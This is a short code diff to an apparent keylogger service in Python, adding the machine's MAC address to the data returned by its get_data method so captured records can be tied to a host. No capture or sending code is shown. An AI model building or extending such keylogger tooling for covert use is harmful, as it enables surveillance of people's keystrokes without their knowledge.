@@ -6,6 +6,7 @@ from datetime import datetime
 from abc import ABC, abstractmethod
 import time
 import threading
+import uuid
 
 
 class KeyLoggerService:
@@ -39,6 +40,8 @@ class KeyLoggerService:
 
     def get_data(self):
         data = self.data
+        mac_address = hex(uuid.getnode())[2:]
+        data = {"mac": mac_address, "data": data}
         self.data = {}
         return data
 
